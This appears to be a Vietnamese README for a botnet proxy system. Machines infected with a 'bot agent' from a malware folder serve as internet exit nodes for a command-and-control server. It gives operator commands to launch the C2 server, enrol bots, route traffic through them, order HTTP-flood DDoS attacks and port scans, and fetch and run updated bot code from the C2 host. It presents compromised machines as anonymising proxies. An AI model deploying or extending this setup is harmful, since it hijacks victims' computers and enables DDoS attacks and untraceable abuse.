# 🚀 C2 PROXY CHAIN SYSTEM

Hệ thống C2 Proxy Chain hoàn chỉnh cho phép các bot đã kết nối đến C2 server trở thành "exit nodes" (đầu ra Internet) cho proxy chain.

## 📋 Tổng Quan

### Kiến Trúc Hệ Thống:
```
Client → C2 Proxy Server → Bot1/Bot2/Bot3... → Internet
```

### Các Thành Phần:
1. **C2 Proxy Server** - Server chính nhận proxy requests từ client
2. **Bot Proxy Agent** - Bot agent hỗ trợ proxy forwarding
3. **Load Balancer** - Cân bằng tải giữa các bot exit nodes
4. **Health Monitor** - Giám sát sức khỏe bot exit nodes
5. **Web Dashboard** - Giao diện quản lý proxy
6. **Integration Test** - Test toàn bộ hệ thống

## 🛠️ Cài Đặt

### Yêu Cầu:
```bash
pip install flask flask-socketio requests psutil
```

### Cấu Trúc File:
```
scripts/
├── c2_proxy_server.py          # C2 Proxy Server chính
├── proxy_load_balancer.py      # Load Balancer & Health Monitor
├── proxy_web_dashboard.py      # Web Dashboard
├── proxy_integration_test.py   # Integration Test
└── README_C2_PROXY_CHAIN.md    # Hướng dẫn này

bane/malware/
└── bot_agent.py                # Bot agent đã được cập nhật
```

## 🚀 Sử Dụng

### 1. Khởi Động C2 Proxy Server

```bash
# Khởi động C2 proxy server
python3 scripts/c2_proxy_server.py --c2-host 0.0.0.0 --c2-port 7777 --proxy-port 8080
```

**Tham số:**
- `--c2-host`: IP của C2 server (mặc định: 0.0.0.0)
- `--c2-port`: Port cho bot connections (mặc định: 7777)
- `--proxy-port`: Port cho client proxy requests (mặc định: 8080)

### 2. Kết Nối Bot Agent

```bash
# Trên máy bot
python3 bane/malware/bot_agent.py --c2-host C2_IP --c2-port 7777
```

Bot sẽ tự động:
- Kết nối đến C2 server
- Bật chế độ proxy khi nhận lệnh `ENABLE_PROXY_MODE`
- Trở thành exit node cho proxy chain

### 3. Cấu Hình Client Proxy

#### A. Browser (SwitchyOmega):
```
Proxy Server: C2_IP:8080
Protocol: HTTP
```

#### B. Command Line:
```bash
export http_proxy=http://C2_IP:8080
export https_proxy=http://C2_IP:8080

# Test proxy
curl http://httpbin.org/ip
```

#### C. Python:
```python
import requests

proxies = {
    'http': 'http://C2_IP:8080',
    'https': 'http://C2_IP:8080'
}

response = requests.get('http://httpbin.org/ip', proxies=proxies)
print(response.json())
```

### 4. Web Dashboard

```bash
# Khởi động web dashboard
python3 scripts/proxy_web_dashboard.py --host 0.0.0.0 --port 5000
```

Truy cập: `http://C2_IP:5000`

**Tính năng Dashboard:**
- Real-time monitoring
- Bot management
- Connection statistics
- Load balancer control
- Health monitoring

## ⚖️ Load Balancing

### Các Thuật Toán:

1. **Round Robin** - Luân phiên giữa các bot
2. **Least Connections** - Chọn bot có ít kết nối nhất
3. **Health Based** - Chọn bot có health score cao nhất
4. **Response Time** - Chọn bot có response time thấp nhất
5. **Weighted Round Robin** - Round robin với trọng số
6. **Random** - Chọn ngẫu nhiên
7. **Region Aware** - Ưu tiên bot cùng region
8. **Circuit Breaker** - Tránh bot bị lỗi

### Cấu Hình Load Balancer:

```python
# Trong c2_proxy_server.py
selected_bot = self.load_balancer.select_bot("round_robin")
```

## 🏥 Health Monitoring

### Health Score Calculation:
- **Response Time**: Thời gian phản hồi trung bình
- **Success Rate**: Tỷ lệ request thành công
- **Connection Count**: Số kết nối hiện tại
- **Last Seen**: Thời gian kết nối cuối

### Health Thresholds:
- **Excellent**: ≥ 80
- **Good**: ≥ 60
- **Warning**: ≥ 30
- **Critical**: < 30

### Circuit Breaker:
- **Closed**: Bot hoạt động bình thường
- **Open**: Bot bị lỗi, tạm thời không sử dụng
- **Half-Open**: Bot đang được test lại

## 🧪 Testing

### Integration Test:

```bash
# Chạy toàn bộ test suite
python3 scripts/proxy_integration_test.py --c2-host 127.0.0.1 --c2-port 7777 --proxy-port 8080
```

**Các Test:**
1. C2 Proxy Server Startup
2. Bot Agent Connection
3. Proxy Functionality
4. Load Balancer
5. Health Monitoring
6. Web Dashboard
7. Stress Testing
8. Error Handling

### Manual Testing:

```bash
# Test proxy với curl
curl --proxy http://C2_IP:8080 http://httpbin.org/ip

# Test với multiple requests
for i in {1..10}; do
    curl --proxy http://C2_IP:8080 http://httpbin.org/ip
done
```

## 📊 Monitoring & Statistics

### Real-time Stats:
- Total requests
- Bytes transferred
- Active connections
- Bot count
- Health scores
- Response times

### Bot Information:
- Bot ID
- Hostname
- Status (online/offline)
- Proxy mode
- Requests handled
- Bytes transferred
- Health score

### Load Balancer Stats:
- Strategy usage
- Selection success rate
- Bot recommendations
- Circuit breaker states

## 🔧 Troubleshooting

### Common Issues:

#### 1. Bot Không Kết Nối:
```bash
# Kiểm tra C2 server
netstat -tlnp | grep 7777

# Kiểm tra bot connection
python3 bane/malware/bot_agent.py --c2-host C2_IP --c2-port 7777
```

#### 2. Proxy Không Hoạt Động:
```bash
# Kiểm tra proxy port
netstat -tlnp | grep 8080

# Test proxy connection
curl --proxy http://C2_IP:8080 http://httpbin.org/ip
```

#### 3. Load Balancer Không Chọn Bot:
```bash
# Kiểm tra bot status
curl http://C2_IP:5000/api/bots

# Kiểm tra load balancer
curl http://C2_IP:5000/api/load_balancer
```

#### 4. Health Score Thấp:
```bash
# Kiểm tra bot health
curl http://C2_IP:5000/api/status

# Restart bot nếu cần
pkill -f bot_agent.py
python3 bane/malware/bot_agent.py --c2-host C2_IP --c2-port 7777
```

### Debug Mode:

```bash
# C2 Proxy Server với debug
python3 scripts/c2_proxy_server.py --c2-host 0.0.0.0 --c2-port 7777 --proxy-port 8080

# Web Dashboard với debug
python3 scripts/proxy_web_dashboard.py --host 0.0.0.0 --port 5000 --debug
```

## 🔒 Security

### Recommendations:

1. **Firewall Rules:**
```bash
# Chỉ cho phép kết nối từ trusted IPs
ufw allow from TRUSTED_IP to any port 7777
ufw allow from TRUSTED_IP to any port 8080
ufw allow from TRUSTED_IP to any port 5000
```

2. **Authentication:**
- Thêm authentication cho web dashboard
- Sử dụng API keys cho bot connections
- Implement rate limiting

3. **Encryption:**
- Sử dụng HTTPS cho web dashboard
- Encrypt communication giữa C2 và bot
- Implement certificate pinning

4. **Monitoring:**
- Log tất cả proxy requests
- Monitor unusual traffic patterns
- Set up alerts cho health issues

## 📈 Performance Optimization

### Tuning Parameters:

1. **Connection Limits:**
```python
# Trong c2_proxy_server.py
max_connections = 100  # Per bot
max_clients = 1000     # Total clients
```

2. **Buffer Sizes:**
```python
# Trong bot_agent.py
BUFFER_SIZE = 4096
```

3. **Timeouts:**
```python
# Connection timeout
CONNECTION_TIMEOUT = 10
# Request timeout
REQUEST_TIMEOUT = 30
```

### Scaling:

1. **Horizontal Scaling:**
- Deploy multiple C2 servers
- Use load balancer for C2 servers
- Implement server clustering

2. **Vertical Scaling:**
- Increase server resources
- Optimize database queries
- Use connection pooling

## 🚀 Advanced Features

### 1. Multi-Region Support:
```python
# Register bot với region
lb.register_bot("bot1", {
    'max_connections': 50,
    'weight': 1,
    'region': 'us-east'
})
```

### 2. Custom Load Balancing:
```python
# Implement custom strategy
def custom_strategy(self, client_region=None):
    # Custom logic here
    return selected_bot
```

### 3. Auto-Scaling:
```python
# Auto-scale based on load
if total_connections > threshold:
    deploy_new_bot()
```

### 4. Analytics:
```python
# Collect detailed analytics
analytics = {
    'request_patterns': [],
    'performance_metrics': {},
    'user_behavior': {}
}
```

## 📝 API Reference

### C2 Proxy Server API:

#### Start Server:
```bash
POST /api/start_server
{
    "c2_host": "0.0.0.0",
    "c2_port": 7777,
    "proxy_port": 8080
}
```

#### Stop Server:
```bash
POST /api/stop_server
```

#### Get Status:
```bash
GET /api/status
```

#### Get Bots:
```bash
GET /api/bots
```

#### Send Bot Command:
```bash
POST /api/bot_command
{
    "bot_id": "bot_123",
    "command": "INFO"
}
```

### Bot Agent Commands:

#### Enable Proxy Mode:
```
ENABLE_PROXY_MODE
```

#### Proxy Request:
```
PROXY_REQUEST:connection_id:target_host:target_port:is_https
```

#### Health Check:
```
HEALTH_CHECK:
```

#### System Info:
```
INFO
```

#### DDoS Attack:
```
DDoS:HTTP_FLOOD:target.com:60
```

#### Port Scan:
```
SCAN:PORTS:192.168.1.1
```

## 🎯 Use Cases

### 1. Anonymous Browsing:
- Route traffic qua multiple bot exit nodes
- Hide real IP address
- Bypass geo-restrictions

### 2. Load Testing:
- Distribute load across multiple bots
- Test application performance
- Simulate real user traffic

### 3. Penetration Testing:
- Use compromised machines as exit nodes
- Test network security
- Perform reconnaissance

### 4. Content Delivery:
- Distribute content via bot network
- Reduce server load
- Improve performance

## 📞 Support

### Logs:
```bash
# C2 Server logs
tail -f /var/log/c2_proxy_server.log

# Bot agent logs
tail -f /var/log/bot_agent.log

# Web dashboard logs
tail -f /var/log/proxy_dashboard.log
```

### Configuration:
```bash
# Edit configuration
nano scripts/c2_proxy_server.py

# Reload configuration
pkill -f c2_proxy_server.py
python3 scripts/c2_proxy_server.py
```

### Updates:
```bash
# Update bot agent
wget https://C2_IP:6666/bot_agent.py
python3 bot_agent.py --c2-host C2_IP --c2-port 7777
```

---

## 🎉 Kết Luận

Hệ thống C2 Proxy Chain cung cấp một giải pháp hoàn chỉnh để biến các bot đã kết nối thành proxy exit nodes. Với load balancing, health monitoring, và web dashboard, hệ thống đảm bảo hiệu suất cao và độ tin cậy.

**Tính năng chính:**
- ✅ C2 Proxy Server với multi-threading
- ✅ Bot Agent hỗ trợ proxy forwarding
- ✅ Load Balancer với 8 thuật toán
- ✅ Health Monitor với circuit breaker
- ✅ Web Dashboard real-time
- ✅ Integration Test suite
- ✅ Comprehensive documentation

**Bắt đầu ngay:**
```bash
# 1. Khởi động C2 server
python3 scripts/c2_proxy_server.py

# 2. Kết nối bot
python3 bane/malware/bot_agent.py --c2-host C2_IP

# 3. Cấu hình proxy
export http_proxy=http://C2_IP:8080

# 4. Test
curl http://httpbin.org/ip
```

Chúc bạn sử dụng thành công! 🚀
